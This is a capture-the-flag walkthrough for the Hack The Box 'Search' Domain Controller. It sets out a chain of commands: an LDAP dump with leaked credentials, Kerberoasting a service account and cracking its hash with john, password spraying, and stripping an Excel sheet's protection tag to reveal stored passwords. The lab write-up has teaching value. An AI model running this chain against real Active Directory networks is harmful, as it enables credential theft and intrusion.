## Overview

Search is a Hard-difficulty Windows machine and a Domain Controller for `search.htb` (host `RESEARCH`). The path to user is pure Active Directory: a credential leaks from a photo on the public website, that credential enumerates AD and Kerberoasts a service account, the cracked service password sprays to a HelpDesk user, and that user can pull a "locked" spreadsheet whose protection is cosmetic — revealing the credentials for `Sierra.Frye` and the user flag.

```bash
nmap -sC -sV 10.129.229.57
```

The service mix screams Domain Controller, and IIS is serving a corporate single-page site on 80/443. `/certsrv` and `/certenroll` hint at an AD Certificate Services role.

## Enumeration

The website's "Our Features" gallery contains a photo of a hand-written sticky-note:

```
Send password to Hope Sharp
IsolationIsKey?
```

Trying common username schemes with that name and password gives a valid domain login: `hope.sharp:IsolationIsKey?`. With one valid credential, the whole directory opens up:

```bash
# Dump AD users/groups with the leaked creds
ldapdomaindump -u 'search\hope.sharp' -p 'IsolationIsKey?' 10.129.229.57
```

## Foothold

**1 — Kerberoast a service account.** Any authenticated user can request a service ticket for an account with an SPN, then crack it offline:

```bash
GetUserSPNs.py -request -dc-ip 10.129.229.57 search.htb/hope.sharp:IsolationIsKey?
john --wordlist=/usr/share/wordlists/rockyou.txt web_svc.hash   # -> @3ONEmillionbaby
```

**2 — Spray the cracked password.** The LDAP dump shows `web_svc` was created by HelpDesk; spraying the recovered password at the HelpDesk users finds it reused by `Edgar.Jacobs` (`@3ONEmillionbaby`).

**3 — Pull the "protected" spreadsheet.** `Edgar.Jacobs` can read the `RedirectedFolders$` share, where `Phishing_Attempt.xlsx` has a protected sheet with a hidden column:

```bash
smbget -U edgar.jacobs 'smb://10.129.229.57/RedirectedFolders$/edgar.jacobs/Desktop/Phishing_Attempt.xlsx'
```

**4 — Bypass the sheet protection.** An `.xlsx` is just a ZIP of XML, and worksheet protection is enforced only by the viewer — not cryptographically. Delete the one tag and re-zip:

```bash
unzip Phishing_Attempt.xlsx
sed -i 's/<sheetProtection[^>]*>//' xl/worksheets/sheet2.xml
zip -fr Phishing_Attempt.xlsx *
```

The now-visible column C holds passwords, including `Sierra.Frye`'s. Validate over SMB:

```bash
nxc smb 10.129.229.57 -u sierra.frye -p '<redacted>'
# [+] search.htb\sierra.frye  (host RESEARCH)
```

## User flag

`Sierra.Frye`'s user flag lives on her redirected Desktop, readable straight off the share:

```bash
smbclient '//10.129.229.57/RedirectedFolders$' -U 'search/sierra.frye%<redacted>' \
  -c 'cd sierra.frye\Desktop; get user.txt'
cat user.txt   # HTB{...}
```
